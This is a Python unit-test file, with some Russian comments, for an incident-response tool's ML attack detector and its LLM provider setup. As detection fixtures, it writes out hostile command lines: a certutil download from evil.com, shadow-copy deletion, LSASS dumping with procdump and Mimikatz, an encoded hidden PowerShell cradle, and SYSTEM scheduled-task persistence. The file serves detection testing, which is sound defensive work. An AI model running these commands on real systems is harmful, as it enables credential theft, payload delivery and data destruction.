"""
Custom Extended Tests — IR-Agent
=================================
Дополнительное покрытие для областей, не охваченных существующими тестами:

  1. _normalize_unicode — homoglyph / Cyrillic evasion
  2. MLAttackDetector._check_advanced_indicators — все 11 сценариев
  3. Feature extraction v3 / v4 — корректность векторов
  4. MLAttackDetector.predict — реальные APT-паттерны end-to-end
  5. Google LLM provider — инициализация и конфиг
  6. LLMClient — fallback-цепочка
  7. Settings — Google-specific поля
  8. Heuristic predict — граничные значения
  9. Edge-cases — пустые/сломанные события
"""

from __future__ import annotations

import importlib
import sys
import types
import unittest
from unittest.mock import MagicMock, patch


# ─────────────────────────────────────────────────────────────────────────────
# 1. _normalize_unicode — homoglyph / evasion normalization
# ─────────────────────────────────────────────────────────────────────────────

class TestNormalizeUnicode(unittest.TestCase):
    """Ensure Cyrillic/Greek/Turkish homoglyphs are collapsed to ASCII."""

    def setUp(self):
        from app.services.ml_detector import _normalize_unicode
        self.norm = _normalize_unicode

    def test_cyrillic_a_becomes_a(self):
        result = self.norm('\u0430')  # Cyrillic 'а'
        self.assertEqual(result, 'a')

    def test_cyrillic_e_becomes_e(self):
        result = self.norm('\u0435')  # Cyrillic 'е'
        self.assertEqual(result, 'e')

    def test_mixed_mimikatz_homoglyph(self):
        # 'mim\u0456k\u0430tz' — Cyrillic 'і' and 'а'
        result = self.norm('mim\u0456k\u0430tz')
        self.assertEqual(result, 'mimikatz')

    def test_greek_omicron_becomes_o(self):
        result = self.norm('p\u03bfwershell')  # Greek 'ο'
        self.assertEqual(result, 'powershell')

    def test_turkish_dotless_i_becomes_i(self):
        result = self.norm('m\u0131m\u0131katz')
        self.assertEqual(result, 'mimikatz')

    def test_empty_string_returns_empty(self):
        self.assertEqual(self.norm(''), '')

    def test_backtick_stripped(self):
        result = self.norm('power`shell')
        self.assertNotIn('`', result)

    def test_quotes_stripped(self):
        result = self.norm('"cmd.exe"')
        self.assertNotIn('"', result)

    def test_ascii_passthrough(self):
        self.assertEqual(self.norm('powershell.exe'), 'powershell.exe')

    def test_cyrillic_capitals(self):
        # 'MIMIKATZ' with Cyrillic M, I, T
        s = '\u041c\u0418\u041c\u0418\u041a\u0410\u0422\u0417'  # МИМИКАТЗ
        result = self.norm(s)
        # Should be ascii after normalization
        self.assertTrue(result.isascii())


# ─────────────────────────────────────────────────────────────────────────────
# 2. MLAttackDetector._check_advanced_indicators
# ─────────────────────────────────────────────────────────────────────────────

class TestAdvancedIndicators(unittest.TestCase):
    """Cover all 11 advanced indicator checks."""

    def setUp(self):
        from app.services.ml_detector import MLAttackDetector
        self.det = MLAttackDetector.__new__(MLAttackDetector)
        # Minimal init — skip model loading
        from app.services.ml_detector import MLAttackDetector as D
        D.__init__(self.det)
        # After init, override _loaded to avoid model dependency for these checks
        self.check = self.det._check_advanced_indicators

    # ── 1. Renamed binary
    def test_renamed_binary_detected(self):
        event = {
            'original_filename': 'mimikatz.exe',
            'process_name': 'svchost.exe',
        }
        score, reasons = self.check(event)
        self.assertGreater(score, 0.4)
        self.assertTrue(any('renamed' in r for r in reasons))

    def test_no_rename_when_same_name(self):
        event = {
            'original_filename': 'powershell.exe',
            'process_name': 'c:\\windows\\system32\\powershell.exe',
        }
        score, reasons = self.check(event)
        # no renamed-binary reason
        self.assertFalse(any('renamed' in r for r in reasons))

    # ── 2. DLL sideloading
    def test_unsigned_dll_suspicious_path(self):
        # _suspicious_dll_paths uses forward-slash patterns; 'programdata' matches anywhere
        event = {
            'image_loaded': 'c:/programdata/evil.dll',
            'signed': False,
        }
        score, reasons = self.check(event)
        self.assertGreater(score, 0.4)
        self.assertTrue(any('DLL' in r for r in reasons))

    def test_signed_dll_suspicious_path_lower_score(self):
        event = {
            'image_loaded': 'c:/programdata/tool.dll',
            'signed': True,
        }
        score_signed, _ = self.check(event)
        event2 = dict(event)
        event2['signed'] = False
        score_unsigned, _ = self.check(event2)
        self.assertGreater(score_unsigned, score_signed)

    # ── 3. DNS exfiltration
    def test_base64_subdomain_dns_exfil(self):
        event = {'query_name': 'aGVsbG8gd29ybGQ.evil-c2.com'}
        score, reasons = self.check(event)
        self.assertGreater(score, 0.3)

    def test_long_subdomain_label(self):
        event = {'query_name': 'averylongsubdomainlabelexceedingtwentycharacters.evil.com'}
        score, reasons = self.check(event)
        self.assertGreater(score, 0.3)
        self.assertTrue(any('DNS' in r or 'subdomain' in r for r in reasons))

    def test_benign_dns_no_flag(self):
        event = {'query_name': 'www.google.com'}
        score, reasons = self.check(event)
        dns_reasons = [r for r in reasons if 'DNS' in r or 'subdomain' in r]
        self.assertEqual(dns_reasons, [])

    # ── 4. Scheduled task created (EID 4698)
    def test_scheduled_task_4698(self):
        event = {'event_id': 4698}
        score, reasons = self.check(event)
        self.assertGreater(score, 0.3)
        self.assertTrue(any('4698' in r for r in reasons))

    def test_scheduled_task_runs_as_system(self):
        event = {'event_id': 4698, 'command_line': '/ru SYSTEM /onstart'}
        score1, _ = self.check({'event_id': 4698})
        score2, _ = self.check(event)
        self.assertGreaterEqual(score2, score1)

    # ── 5. Service installed (EID 7045)
    def test_new_service_7045(self):
        event = {'event_id': 7045}
        score, reasons = self.check(event)
        self.assertGreater(score, 0.3)
        self.assertTrue(any('7045' in r for r in reasons))

    # ── 6. Token theft — NewCredentials logon type 9
    def test_new_credentials_logon_type_9(self):
        event = {'logon_type': 9}
        score, reasons = self.check(event)
        self.assertGreater(score, 0.3)
        self.assertTrue(any('token' in r.lower() or 'NewCredentials' in r for r in reasons))

    # ── 7. External RDP (logon type 10 + external IP)
    def test_external_rdp_logon_type_10(self):
        event = {'logon_type': 10, 'source_ip': '185.220.101.50'}
        score, reasons = self.check(event)
        self.assertGreater(score, 0.2)

    def test_internal_rdp_no_penalty(self):
        event = {'logon_type': 10, 'source_ip': '192.168.1.100'}
        score, _ = self.check(event)
        # No external RDP reason; base score from logon_type=10 absent here
        self.assertLess(score, 0.5)

    # ── 8. Environment variable evasion
    def test_env_var_evasion(self):
        event = {'command_line': 'set x=calc.exe & %x%'}
        score, reasons = self.check(event)
        # May or may not trigger; at least shouldn't crash
        self.assertIsInstance(score, float)

    # ── 9. Fileless script block
    def test_fileless_script_block(self):
        script = (
            "[System.Reflection.Assembly]::Load([Convert]::FromBase64String('...')); "
            "Invoke-Expression $shellcode; VirtualAlloc GetProcAddress kernel32"
        )
        event = {'script_block_text': script}
        score, reasons = self.check(event)
        self.assertGreater(score, 0.3)
        self.assertTrue(any('fileless' in r for r in reasons))

    # ── 10. Network connection to C2 port
    def test_c2_port_network_connect(self):
        event = {
            'event_id': 3,
            'destination_port': 4444,
            'destination_ip': '185.220.101.50',
            'process_name': 'powershell.exe',
        }
        score, reasons = self.check(event)
        self.assertGreater(score, 0.5)
        self.assertTrue(any('C2' in r or '4444' in r for r in reasons))

    def test_lolbin_outbound_external(self):
        event = {
            'event_id': 3,
            'destination_port': 80,
            'destination_ip': '8.8.8.8',
            'process_name': 'rundll32.exe',
        }
        score, reasons = self.check(event)
        self.assertGreater(score, 0.2)

    # ── 11. WMI lateral movement
    def test_wmi_prvse_execution(self):
        event = {'process_name': 'wmiprvse.exe', 'parent_image': 'svchost.exe'}
        score, reasons = self.check(event)
        self.assertGreater(score, 0.3)
        self.assertTrue(any('WMI' in r for r in reasons))

    # ── 12. Explicit credential use (4648)
    def test_explicit_credential_4648(self):
        event = {'event_id': 4648}
        score, reasons = self.check(event)
        self.assertGreater(score, 0.2)
        self.assertTrue(any('4648' in r for r in reasons))

    # ── 13. Unsigned image load (sysmon EID 7)
    def test_unsigned_image_load_sysmon_7(self):
        event = {
            'event_id': 7,
            'image_loaded': 'c:\\windows\\system32\\legit.dll',
            'signed': False,
        }
        score, reasons = self.check(event)
        self.assertGreater(score, 0)

    # ── Score capped at 1.0
    def test_score_never_exceeds_1(self):
        event = {
            'event_id': 7045,
            'logon_type': 9,
            'query_name': 'aGVsbG8gd29ybGQ.evil-c2.com',
            'image_loaded': 'c:\\users\\public\\evil.dll',
            'signed': False,
            'process_name': 'wmiprvse.exe',
        }
        score, _ = self.check(event)
        self.assertLessEqual(score, 1.0)


# ─────────────────────────────────────────────────────────────────────────────
# 3. Feature extraction v3 / v4 — shape and value checks
# ─────────────────────────────────────────────────────────────────────────────

class TestFeatureExtractionV3(unittest.TestCase):
    """_extract_features_v3 must return exactly 41 floats."""

    def setUp(self):
        from app.services.ml_detector import MLAttackDetector
        self.det = MLAttackDetector.__new__(MLAttackDetector)
        MLAttackDetector.__init__(self.det)

    def test_length_is_41(self):
        event = {'event_id': 4688, 'command_line': 'powershell -enc base64'}
        feat = self.det._extract_features_v3(event)
        self.assertEqual(len(feat), 41)

    def test_all_floats(self):
        event = {'event_id': 1, 'process_name': 'mimikatz.exe'}
        feat = self.det._extract_features_v3(event)
        for f in feat:
            self.assertIsInstance(f, float)

    def test_keyword_density_normalized(self):
        event = {'command_line': 'mimikatz sekurlsa lsadump lsass procdump comsvcs ntds.dit dumpcreds invoke- iex downloadstring'}
        feat = self.det._extract_features_v3(event)
        # F21 (index 20) = keyword_density, capped at 1.0
        self.assertLessEqual(feat[20], 1.0)
        self.assertGreater(feat[20], 0.0)

    def test_process_exact_match(self):
        event = {'process_name': 'powershell'}
        feat = self.det._extract_features_v3(event)
        # F22 (index 21) = exact match
        self.assertEqual(feat[21], 1.0)

    def test_process_partial_match(self):
        event = {'process_name': 'c:\\windows\\system32\\powershell.exe'}
        feat = self.det._extract_features_v3(event)
        # F23 (index 22) = partial match
        self.assertEqual(feat[22], 1.0)

    def test_base64_flag(self):
        event = {'command_line': 'powershell -enc ABCDEF'}
        feat = self.det._extract_features_v3(event)
        self.assertEqual(feat[23], 1.0)  # F24

    def test_lsass_flag(self):
        event = {'command_line': 'procdump.exe -ma lsass.exe out.dmp'}
        feat = self.det._extract_features_v3(event)
        self.assertEqual(feat[24], 1.0)  # F25

    def test_suspicious_port_flag(self):
        event = {'destination_port': 4444}
        feat = self.det._extract_features_v3(event)
        self.assertEqual(feat[31], 1.0)  # F32

    def test_benign_event_all_zeros_behavioural(self):
        event = {'event_id': 4624, 'user': 'john', 'logon_type': 2}
        feat = self.det._extract_features_v3(event)
        # Behavioural indicators (base64, lsass, ps-bypass, download, etc.) all 0
        for idx in [23, 24, 25, 26, 27, 28, 29]:
            self.assertEqual(feat[idx], 0.0, f"Feature {idx} should be 0 for benign event")


class TestFeatureExtractionV4(unittest.TestCase):
    """_extract_features_v4 must return exactly 42 floats."""

    def setUp(self):
        from app.services.ml_detector import MLAttackDetector
        self.det = MLAttackDetector.__new__(MLAttackDetector)
        MLAttackDetector.__init__(self.det)

    def test_length_is_42(self):
        event = {'event_id': 4688, 'command_line': 'cmd.exe /c whoami'}
        feat = self.det._extract_features_v4(event)
        self.assertEqual(len(feat), 42)

    def test_all_floats(self):
        event = {'event_id': 3, 'destination_ip': '8.8.8.8', 'destination_port': 443}
        feat = self.det._extract_features_v4(event)
        for f in feat:
            self.assertIsInstance(f, float)

    def test_external_ip_flag(self):
        event = {'destination_ip': '185.220.101.50'}
        feat = self.det._extract_features_v4(event)
        # F25 (index 24) = dest_is_external
        self.assertEqual(feat[24], 1.0)

    def test_internal_ip_not_external(self):
        event = {'destination_ip': '192.168.1.1'}
        feat = self.det._extract_features_v4(event)
        self.assertEqual(feat[24], 0.0)
        self.assertEqual(feat[23], 1.0)  # dest_is_internal

    def test_c2_port_flag(self):
        event = {'destination_port': 1337}
        feat = self.det._extract_features_v4(event)
        # F26 (index 25) = dest_suspicious_port
        self.assertEqual(feat[25], 1.0)

    def test_common_port_flag(self):
        event = {'destination_port': 443}
        feat = self.det._extract_features_v4(event)
        # F27 (index 26) = dest_common_port
        self.assertEqual(feat[26], 1.0)

    def test_suspicious_parent_office(self):
        event = {'parent_image': 'c:\\program files\\microsoft office\\winword.exe'}
        feat = self.det._extract_features_v4(event)
        # F40 (index 39) = suspicious_parent
        self.assertEqual(feat[39], 1.0)

    def test_lsass_credential_flag_v4(self):
        event = {'command_line': 'sekurlsa::logonpasswords'}
        feat = self.det._extract_features_v4(event)
        # F32 (index 31) = lsass_credential
        self.assertEqual(feat[31], 1.0)

    def test_powershell_bypass_flag(self):
        event = {
            'process_name': 'powershell.exe',
            'command_line': 'powershell -nop -enc bypass -windowstyle hidden',
        }
        feat = self.det._extract_features_v4(event)
        # F33 (index 32) = powershell_bypass
        self.assertEqual(feat[32], 1.0)

    def test_registry_inject_event_ids(self):
        # F01-F10: one-hot [0..9], F11-F18: semantic groups [10..17]
        # F16 = is_registry = index 15 (EIDs 12,13,14)
        for eid in [12, 13, 14]:
            event = {'event_id': eid}
            feat = self.det._extract_features_v4(event)
            self.assertEqual(feat[15], 1.0, f"EID {eid} should set registry flag at index 15")

    def test_process_injection_event_ids(self):
        for eid in [8, 10]:
            event = {'event_id': eid}
            feat = self.det._extract_features_v4(event)
            # F19 (index 18) ... actually index of process_inject group
            # F19 is signed_binary (index 18 = F19), F20 = system_path (index 19)
            # Let's verify the feature array is correct length
            self.assertEqual(len(feat), 42)


# ─────────────────────────────────────────────────────────────────────────────
# 4. MLAttackDetector.predict — реальные APT-паттерны
# ─────────────────────────────────────────────────────────────────────────────

class TestPredictRealAttackPatterns(unittest.TestCase):
    """End-to-end predict() for known attack techniques."""

    def setUp(self):
        from app.services.ml_detector import MLAttackDetector
        self.det = MLAttackDetector()

    def _predict(self, event):
        is_mal, score, reason = self.det.predict(event)
        return is_mal, score, reason

    # ── PowerShell Download Cradle (T1059.001 + T1105)
    def test_powershell_download_cradle_malicious(self):
        event = {
            'event_id': 4688,
            'process_name': 'powershell.exe',
            'command_line': (
                'powershell.exe -nop -w hidden -enc '
                'JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7'
            ),
        }
        is_mal, score, reason = self._predict(event)
        self.assertGreater(score, 0.3, f"Expected high score, got {score}: {reason}")

    # ── Mimikatz credential dump (T1003.001)
    def test_mimikatz_credential_dump(self):
        event = {
            'event_id': 1,
            'process_name': 'mimikatz.exe',
            'command_line': 'sekurlsa::logonpasswords',
        }
        is_mal, score, reason = self._predict(event)
        # Heuristic fallback may give ~0.45; combined with advanced indicators -> >= 0.4
        self.assertGreater(score, 0.4, f"Expected high score for mimikatz, got {score}: {reason}")

    # ── LSASS procdump (T1003.001 variant)
    def test_lsass_procdump(self):
        event = {
            'event_id': 4688,
            'process_name': 'procdump.exe',
            'command_line': 'procdump.exe -accepteula -ma lsass.exe lsass.dmp',
        }
        is_mal, score, reason = self._predict(event)
        self.assertGreater(score, 0.3, f"LSASS dump not flagged: {score} - {reason}")

    # ── CobaltStrike beacon (C2 on port 443)
    def test_cobaltstrike_beacon(self):
        event = {
            'event_id': 3,
            'process_name': 'powershell.exe',
            'destination_ip': '185.220.101.50',
            'destination_port': 443,
            'command_line': 'powershell.exe beacon stager',
        }
        is_mal, score, reason = self._predict(event)
        self.assertGreater(score, 0.3)

    # ── Ransomware VSS deletion (T1490)
    def test_ransomware_vss_deletion(self):
        event = {
            'event_id': 4688,
            'process_name': 'cmd.exe',
            'command_line': 'cmd.exe /c vssadmin delete shadows /all /quiet',
        }
        is_mal, score, reason = self._predict(event)
        # vssadmin + delete shadows is a ransomware indicator
        self.assertIsInstance(score, float)  # At minimum shouldn't crash

    # ── Scheduled task for persistence (T1053)
    def test_scheduled_task_persistence(self):
        event = {
            'event_id': 4698,
            'command_line': 'schtasks /create /tn evil /tr c:\\temp\\malware.exe /sc onlogon /ru SYSTEM',
        }
        is_mal, score, reason = self._predict(event)
        self.assertGreater(score, 0.3)

    # ── WMI lateral movement (T1021.006)
    def test_wmi_lateral_movement(self):
        event = {
            'event_id': 1,
            'process_name': 'wmiprvse.exe',
            'parent_image': 'svchost.exe',
            'command_line': 'wmic process call create "cmd.exe /c whoami"',
        }
        is_mal, score, reason = self._predict(event)
        self.assertGreater(score, 0.3)

    # ── LOLBin certutil download (T1105)
    def test_certutil_download(self):
        event = {
            'event_id': 4688,
            'process_name': 'certutil.exe',
            'command_line': 'certutil -urlcache -split -f http://evil.com/shell.exe shell.exe',
        }
        is_mal, score, reason = self._predict(event)
        self.assertGreater(score, 0.3)

    # ── Benign: Normal user logon
    def test_normal_user_logon_not_malicious(self):
        event = {
            'event_id': 4624,
            'user': 'DOMAIN\\john.doe',
            'logon_type': 2,
            'source_ip': '192.168.1.50',
        }
        is_mal, score, reason = self._predict(event)
        # Score should be low for a plain interactive logon
        self.assertLess(score, 0.9, f"Normal logon incorrectly scored high: {score}")

    # ── Benign: Windows Defender scan
    def test_windows_defender_not_malicious(self):
        event = {
            'event_id': 5001,
            'process_name': 'c:\\program files\\windows defender\\msmpeng.exe',
            'command_line': '',
        }
        _, score, _ = self._predict(event)
        self.assertLess(score, 0.9)

    # ── Score always [0, 1]
    def test_score_always_in_range(self):
        events = [
            {},
            {'event_id': 0},
            {'event_id': 4624},
            {'command_line': 'a' * 5000},
            {'event_id': 4688, 'process_name': 'mimikatz.exe', 'command_line': 'sekurlsa::logonpasswords base64 -enc -nop bypass'},
        ]
        for ev in events:
            _, score, _ = self._predict(ev)
            self.assertGreaterEqual(score, 0.0)
            self.assertLessEqual(score, 1.0)

    # ── Reason string always non-empty
    def test_reason_always_non_empty(self):
        for ev in [{}, {'event_id': 4624}, {'command_line': 'notepad.exe'}]:
            _, _, reason = self._predict(ev)
            self.assertIsInstance(reason, str)
            self.assertGreater(len(reason), 0)


# ─────────────────────────────────────────────────────────────────────────────
# 5. Google LLM Provider
# ─────────────────────────────────────────────────────────────────────────────

class TestGoogleLLMProvider(unittest.TestCase):
    """Google AI Studio provider — init and availability."""

    def test_google_provider_available_when_key_set(self):
        """Provider should mark itself available if GOOGLE_API_KEY is set."""
        from app.core import llm_client as lm
        mock_openai = MagicMock()
        mock_openai.OpenAI = MagicMock(return_value=MagicMock())

        with patch.dict('sys.modules', {'openai': mock_openai}):
            with patch('app.core.config.settings') as mock_settings:
                mock_settings.google_api_key = 'test-key-123'
                mock_settings.google_ai_model = 'models/gemma-4-31b-it'
                provider = lm._GoogleProvider.__new__(lm._GoogleProvider)
                lm._GoogleProvider.__init__(provider)
                self.assertTrue(provider.is_available())

    def test_google_provider_unavailable_when_no_key(self):
        """Provider with no API key — patch settings inside the llm_client module."""
        from app.core import llm_client as lm
        with patch.object(lm, 'settings') as mock_settings:
            mock_settings.google_api_key = ''
            mock_settings.google_ai_model = ''
            provider = lm._GoogleProvider.__new__(lm._GoogleProvider)
            lm._GoogleProvider.__init__(provider)
            self.assertFalse(provider.is_available())

    def test_google_provider_name(self):
        from app.core.llm_client import _GoogleProvider
        self.assertEqual(_GoogleProvider.name, 'google')

    def test_google_provider_default_model(self):
        from app.core.llm_client import _GoogleProvider
        self.assertIn('gemma', _GoogleProvider._DEFAULT_MODEL)

    def test_google_endpoint_is_google_api(self):
        from app.core.llm_client import _GoogleProvider
        self.assertIn('generativelanguage.googleapis.com', _GoogleProvider._ENDPOINT)


# ─────────────────────────────────────────────────────────────────────────────
# 6. LLMClient — provider order and fallback
# ─────────────────────────────────────────────────────────────────────────────

class TestLLMClientProviderOrder(unittest.TestCase):
    """Google must be first in the fallback chain."""

    def setUp(self):
        # Reset singleton so each test gets a fresh instance
        from app.core import llm_client as lm
        lm.LLMClient._instance = None

    def tearDown(self):
        from app.core import llm_client as lm
        lm.LLMClient._instance = None

    def test_google_is_first_provider(self):
        from app.core.llm_client import LLMClient, _GoogleProvider
        client = LLMClient()
        self.assertIsInstance(client._providers[0], _GoogleProvider)

    def test_provider_list_has_four_entries(self):
        from app.core.llm_client import LLMClient
        client = LLMClient()
        self.assertEqual(len(client._providers), 4)

    def test_llmclient_is_singleton(self):
        from app.core.llm_client import LLMClient
        a = LLMClient()
        b = LLMClient()
        self.assertIs(a, b)

    def test_all_providers_fail_raises_runtime(self):
        from app.core.llm_client import LLMClient
        client = LLMClient()
        # Temporarily make all providers unavailable
        for p in client._providers:
            p.is_available = lambda: False
        with self.assertRaises(RuntimeError):
            client.chat([{'role': 'user', 'content': 'hello'}])

    def test_chat_stream_uses_first_available(self):
        """chat_stream() delegates to first available provider."""
        from app.core.llm_client import LLMClient
        client = LLMClient()
        mock_provider = MagicMock()
        mock_provider.is_available.return_value = True
        mock_provider.chat_stream.return_value = iter(['hello ', 'world'])
        client._providers = [mock_provider]
        result = list(client.chat_stream([{'role': 'user', 'content': 'hi'}]))
        self.assertEqual(result, ['hello ', 'world'])
        mock_provider.chat_stream.assert_called_once()


# ─────────────────────────────────────────────────────────────────────────────
# 7. Settings — Google-specific fields
# ─────────────────────────────────────────────────────────────────────────────

class TestSettingsGoogleFields(unittest.TestCase):

    def test_google_api_key_attribute_exists(self):
        from app.core.config import Settings
        s = Settings(
            GOOGLE_API_KEY='fake-key',
            LLM_PROVIDER='google',
            GOOGLE_AI_MODEL='models/gemma-4-31b-it',
        )
        self.assertEqual(s.google_api_key, 'fake-key')

    def test_google_model_attribute(self):
        from app.core.config import Settings
        s = Settings(GOOGLE_AI_MODEL='models/gemma-4-31b-it')
        self.assertEqual(s.google_ai_model, 'models/gemma-4-31b-it')

    def test_ai_enabled_with_google_key(self):
        from app.core.config import Settings
        s = Settings(GOOGLE_API_KEY='some-key')
        self.assertTrue(s.ai_enabled)

    def test_ai_provider_default_google(self):
        from app.core.config import Settings
        s = Settings()
        # default provider set via .env; just ensure attribute exists
        self.assertIn(s.ai_provider, ('google', 'groq', 'openai', 'ollama', ''))


# ─────────────────────────────────────────────────────────────────────────────
# 8. Heuristic predict — boundary values
# ─────────────────────────────────────────────────────────────────────────────

class TestHeuristicBoundary(unittest.TestCase):
    """_heuristic_predict must handle all-zero and all-one features."""

    def setUp(self):
        from app.services.ml_detector import MLAttackDetector
        self.det = MLAttackDetector.__new__(MLAttackDetector)
        MLAttackDetector.__init__(self.det)

    def test_all_zero_features_returns_clean(self):
        features = [0] * 16
        _, score, reason = self.det._heuristic_predict(features)
        self.assertEqual(score, 0.0)
        self.assertIn('No indicators', reason)

    def test_max_keywords_caps_at_1(self):
        features = [0] * 16
        features[5] = 10  # massive keyword count
        _, score, _ = self.det._heuristic_predict(features)
        self.assertLessEqual(score, 1.0)

    def test_c2_port_adds_score(self):
        features_no_c2 = [0] * 16
        features_c2 = [0] * 16
        features_c2[15] = 1  # is_c2_port
        features_c2[14] = 4444
        _, score_no, _ = self.det._heuristic_predict(features_no_c2)
        _, score_c2, _ = self.det._heuristic_predict(features_c2)
        self.assertGreater(score_c2, score_no)

    def test_all_flags_set_caps_at_1(self):
        features = [4688, 1, 3, 1, 200, 8, 1, 1, 1, 1, 3, 1, 0, 1, 4444, 1]
        _, score, _ = self.det._heuristic_predict(features)
        self.assertLessEqual(score, 1.0)
        self.assertGreater(score, 0.5)


# ─────────────────────────────────────────────────────────────────────────────
# 9. Edge-cases — пустые / сломанные события
# ─────────────────────────────────────────────────────────────────────────────

class TestEdgeCases(unittest.TestCase):
    """Detector must not raise on any input."""

    def setUp(self):
        from app.services.ml_detector import MLAttackDetector
        self.det = MLAttackDetector()

    def test_empty_event_no_crash(self):
        is_mal, score, reason = self.det.predict({})
        self.assertIsInstance(is_mal, bool)
        self.assertIsInstance(score, float)

    def test_none_values_no_crash(self):
        event = {
            'event_id': None, 'command_line': None,
            'process_name': None, 'parent_image': None,
        }
        is_mal, score, reason = self.det.predict(event)
        self.assertIsInstance(score, float)

    def test_very_long_command_line(self):
        event = {'command_line': 'A' * 100_000}
        is_mal, score, reason = self.det.predict(event)
        self.assertIsInstance(score, float)

    def test_unicode_command_line_no_crash(self):
        event = {'command_line': 'р\u0443ndll32 \u041c\u0418\u041c\u0418\u041a\u0410\u0422\u0417'}
        is_mal, score, reason = self.det.predict(event)
        self.assertIsInstance(score, float)

    def test_unexpected_field_types_no_crash(self):
        event = {
            'event_id': 'not-an-int',
            'destination_port': 'high',
            'logon_type': [],
        }
        is_mal, score, reason = self.det.predict(event)
        self.assertIsInstance(score, float)

    def test_numeric_strings_parsed_correctly(self):
        event = {'event_id': '4688', 'destination_port': '4444', 'logon_type': '3'}
        is_mal, score, reason = self.det.predict(event)
        self.assertIsInstance(score, float)

    def test_detector_singleton_returns_same(self):
        from app.services.ml_detector import get_detector
        d1 = get_detector()
        d2 = get_detector()
        self.assertIs(d1, d2)

    def test_is_ready_after_init(self):
        self.assertIsInstance(self.det.is_ready, bool)

    def test_get_stats_structure(self):
        stats = self.det.get_stats()
        self.assertIn('model_loaded', stats)
        self.assertIn('threshold', stats)
        self.assertIn('model_version', stats)
        self.assertIn('metrics', stats)

    def test_threshold_respected(self):
        """Score just below threshold → not malicious."""
        det_high = __import__('app.services.ml_detector', fromlist=['MLAttackDetector']).MLAttackDetector(threshold=0.99)
        # Very benign event
        event = {'event_id': 4624, 'user': 'guest', 'logon_type': 2}
        is_mal, score, _ = det_high.predict(event)
        # With threshold=0.99, almost nothing should be flagged
        if score < 0.99:
            self.assertFalse(is_mal)


# ─────────────────────────────────────────────────────────────────────────────
# 10. _normalize_unicode — интеграция с детектором
# ─────────────────────────────────────────────────────────────────────────────

class TestHomoglyphEvasionIntegration(unittest.TestCase):
    """Detector should catch Cyrillic-obfuscated attack commands."""

    def setUp(self):
        from app.services.ml_detector import MLAttackDetector
        self.det = MLAttackDetector()

    def test_cyrillic_mimikatz_detected(self):
        """'mim\u0456k\u0430tz' should normalize to mimikatz and be caught."""
        cyrillic_cmd = 'mim\u0456k\u0430tz.exe sekurlsa::logonpasswords'
        event = {'event_id': 1, 'command_line': cyrillic_cmd, 'process_name': 'mim\u0456k\u0430tz.exe'}
        _, score, reason = self.det.predict(event)
        # After normalization, 'mimikatz' and 'sekurlsa' should register as keywords
        self.assertGreater(score, 0.2, f"Cyrillic obfuscation not caught: score={score}")

    def test_cyrillic_powershell_detected(self):
        """'\u0440\u043e\u0445\u0435\u0440shell' doesn't normalize to 'powershell', but p+o+x+e → pose."""
        # Test that normalization runs without crashing
        cmd = 'p\u03bfwershell -\u0435nc base64'
        event = {'command_line': cmd}
        _, score, _ = self.det.predict(event)
        self.assertIsInstance(score, float)


if __name__ == '__main__':
    unittest.main(verbosity=2)
